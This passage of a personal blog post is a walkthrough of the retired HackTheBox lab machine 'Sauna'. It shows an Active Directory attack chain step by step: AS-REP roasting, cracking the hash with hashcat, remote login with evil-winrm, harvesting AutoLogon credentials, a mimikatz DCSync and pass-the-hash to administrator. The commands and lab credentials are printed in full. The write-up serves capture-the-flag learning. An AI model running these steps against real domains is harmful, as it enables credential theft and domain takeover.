+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-NcType: 0
+|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+|         dc: EGOTISTICAL-BANK
+|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
+|\_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o\:microsoft\:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done at Sat Apr  4 06\:13\:53 2020 -- 1 IP address (1 host up) scanned in 14.14 seconds&lt;/root&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;
+</code></pre></div></div>
+
+<p>As I tried a bunch of stuff using enum4linux, ldapsearch, rpcclient nothing returned out.</p>
+
+<p><img src="/assets/img/sample/user.png" alt="">
+So I had to make my own user list from the aboutUs page from the url.</p>
+
+<pre class="center"> <span style="color:yellow">
+fergussmith
+shauncoins
+hugobear
+bowietaylor
+sophiedirver
+stevenkerb
+fsmith
+scoins
+hbear
+btaylor
+dsophie
+sophied
+skerb
+ksteven
+bhugo</span> 
+</pre>
+
+<h3 id="getting-the-tgt">Getting the TGT</h3>
+
+<p>Using GetNPUsers.py, I was able to get the TGT of a user and cracking the TGT using HASHCAT.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py -dc-ip sauna.htb -usersfile users.txt EGOTISTICAL-BANK.LOCAL/
+Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eb75b20e0b65a8f0f42c52a06403a767$0423963b218ce13f92bbca4dbab1691b0a0f390bd9070f9524c92f800f46591462f1f5271e4ac41f42bca677e7e7479de436f053f8e4373d3ef45ac872a4c0f5b9073d2f34c05b063c5bac94e9c432fc6c6ea41a15afcc30f324ffcd5137540c0847f2a5a0dadcae7491e3fda91d26c0e929f377ec97a244c291159f02fc5d723cc1f3f5dc5064a6f67ecf56a27aeaf84d005aff8ec3e476e1e1c7f5f0fb20340ec81ea50de0838bcf2489d70ca04920f312b2e7d0827106768d09ea6f07cb117d11547b8ae3752dfc8398f8cb1110332cb6f412f0610f6c3a85ad8cc680d2d61f14de3f5bf59083ed62055b4fb41f3be91b5275f2f23ae411588ac45a65ed2d
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)` 
+</code></pre></div></div>
+
+<h3 id="hashcat">HASHCAT</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dictionary cache hit:
+* Filename..: D:\Wordlist\rockyou.txt
+* Passwords.: 14344387
+* Bytes.....: 139921579
+* Keyspace..: 14344387
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63efdef11ee2782d87399829857e$2109910f4bf10633f492b1b882805e4330caaa318fb715b4c04c0516f988fd06bfdeec8c2aa9a72bb8a1683ffe124e9ad6e67461be0c6ec8b423996a07217ab2c5835e1743318ab28f882f09a99ebc94409d4716cd6863e153003e62c24897b231f49daf725b7e98e3fd89d973e7c73613c9c0cafedbf341b1c93f451d5f07775ca94df35dbd858a7864e9c83182f93f88023b2ccbc8c584d7c4600a971b17614def93c8e270be2375d25717590e9c3edd83b618775dd812cd3c1c14bea8b3a6416249b9f6d5e4f9f249589c22dca0c75f4eb60fe0500ef78f72038391d2b239807f45587c3c097482d29761ff9ddd3554d6f15bf2b409a545b59d5196faa0d7:Thestrokes23
+Cracking performance lower than expected?
+
+* Append -O to the commandline.
+  This lowers the maximum supported password- and salt-length (typically down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Update your OpenCL runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 AS-REP etype 23
+Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63e...faa0d7
+Time.Started.....: Sat Apr 04 16\:02\:10 2020 (5 secs)
+Time.Estimated...: Sat Apr 04 16\:02\:15 2020 (0 secs)
+Guess.Base.......: File (D:\Wordlist\rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2001.8 kH/s (12.17ms) @ Accel:256 Loops:1 Thr:64 Vec:1
+Speed.#2.........:    93174 H/s (7.22ms) @ Accel:4 Loops:1 Thr:64 Vec:1
+Speed.#*.........:  2094.9 kH/s
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 10543104/14344387 (73.50%)
+Rejected.........: 0/10543104 (0.00%)
+Restore.Point....: 10455040/14344387 (72.89%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: _20003479KNL -&gt; Teague51
+Candidates.#2....: a0122455276 -&gt; _2000dani
+Hardware.Mon.#1..: Temp: 54c Util: 27% Core: 928MHz Mem:2505MHz Bus:16
+Hardware.Mon.#2..: N/A
+
+Started: Sat Apr 04 16\:01\:47 2020
+Stopped: Sat Apr 04 16\:02\:17 2020
+</code></pre></div></div>
+
+<h3 id="getting-usertxt">Getting User.txt</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u fsmith -p Thestrokes23 -i sauna.htb
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\FSmith&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; dir
+
+    Directory: C:\Users\FSmith\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/23/2020  10:03 AM             34 user.txt
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">privilege escalation</h3>
+
+<p>Uploading and executing <span style="color:yellow">winPEAS</span>, I got some Autologin credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Looking for AutoLogon credentials(T1012)
+&lt;span style="color:yellow"&gt;    Some AutoLogon credentials were found!!&lt;/span&gt;
+    DefaultDomainName             :  35mEGOTISTICALBANK
+&lt;span style="color:yellow"&gt;   DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
+&lt;span style="color:yellow"&gt;   DefaultPassword               :  Moneymakestheworldgoround! &lt;/span&gt;
+</code></pre></div></div>
+
+<p>Logging in as svc_loanmanager has not worked for me. Trying in a bunch of different ways I found the user name is [svc_loanmgr].</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                   SID
+=========================== ==============================================
+egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code></pre></div></div>
+
+<p>As nothing seems to be intresting from [whoami /all], I used [BloodHound] to see the structure of the domain.<br>
+<img src="/assets/img/sample/dcsync.png" alt=""><br>
+Seeing svc_loanmanager having the rights of DCsync, I moved to mimikatz to dump the hash of administrator.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimikatz.exe "lsadump::dcsync /user:administrator" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18\:30\:37
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:administrator
+[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
+[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
+[DC] 'administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 1/24/2020 10\:14\:15 AM
+Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
+    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : caab2b641b39e342e0bdfcd150b1683e
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
+      des_cbc_md5       (4096) : 19d5f15d689b1ce5
+    OldCredentials
+      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
+      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
+      des_cbc_md5       (4096) : d9379d13f7c15d1c
+
+* Primary:Kerberos *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 19d5f15d689b1ce5
+    OldCredentials
+      des_cbc_md5       : d9379d13f7c15d1c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  3fbea1ff422da035f1dc9b0ce45e84ea
+    02  708091daa9db25abbd1d94246e4257e2
+    03  417f2e40d5be8d436af749ed9fddb0b0
+    04  3fbea1ff422da035f1dc9b0ce45e84ea
+    05  50cb7cfb64edf83218804d934e30d431
+    06  781dbcf7b8f9079382a1948f26f561ee
+    07  4052111530264023a7d445957f5146e6
+    08  8f4bffc5d94cc294272cd0c836e15c47
+    09  0c81bc892ea87f7dd0f4a3a05b51f158
+    10  f8c10a5bd37ea2568976d47ef12e55b9
+    11  8f4bffc5d94cc294272cd0c836e15c47
+    12  023b04503e3eef421de2fcaf8ba1297d
+    13  613839caf0cf709da25991e2e5cb63cf
+    14  16974c015c9905fb27e55a52dc14dfb0
+    15  3c8af7ccd5e9bd131849990d6f18954b
+    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
+    17  6eeda5f64e4adef4c299717eafbd2850
+    18  3b32ec94978feeac76ba92b312114e2c
+    19  b25058bc1ebfcac10605d39f65bff67f
+    20  89e75cc6957728117eb1192e739e5235
+    21  7e6d891c956f186006f07f15719a8a4e
+    22  a2cada693715ecc5725a235d3439e6a2
+    23  79e1db34d98ccd050b493138a3591683
+    24  1f29ace4f232ebce1a60a48a45593205
+    25  9233c8df5a28ee96900cc8b59a731923
+    26  08c02557056f293aab47eccf1186c100
+    27  695caa49e68da1ae78c1523b3442e230
+    28  57d7b68bd2f06eae3ba10ca342e62a78
+    29  3f14bb208435674e6a1cb8a957478c18
+
+mimikatz(commandline) # exit
+Bye! 
+</code></pre></div></div>
+
+<h3 id="getting-roottxt">Getting root.txt</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i sauna.htb
+</code></pre></div></div>
+
+<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>
+
+<p><img src="/assets/img/sample/sauna-root.png" alt=""></p>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/retired/2020/06/12/Monteverde.html" title="HackTheBox Monteverde">HackTheBox Monteverde</a><a class="next" href="/otherposts/2020/06/24/Ganana.html" title="VulnHub GANANA">VulnHub GANANA</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/tryhackme/2020/03/29/Mrrobot.html" title="VulnHub GANANA">Tryhackme MrRobot</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/03/13/Bashed.html" title="VulnHub GANANA">HackTheBox Bashed</a></li>
+<li><a class="post-link" href="/otherposts/2020/04/15/Kali-Linux-Tools.html" title="VulnHub GANANA">Kali-Linux-Tools</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/06/12/Monteverde.html" title="VulnHub GANANA">HackTheBox Monteverde</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
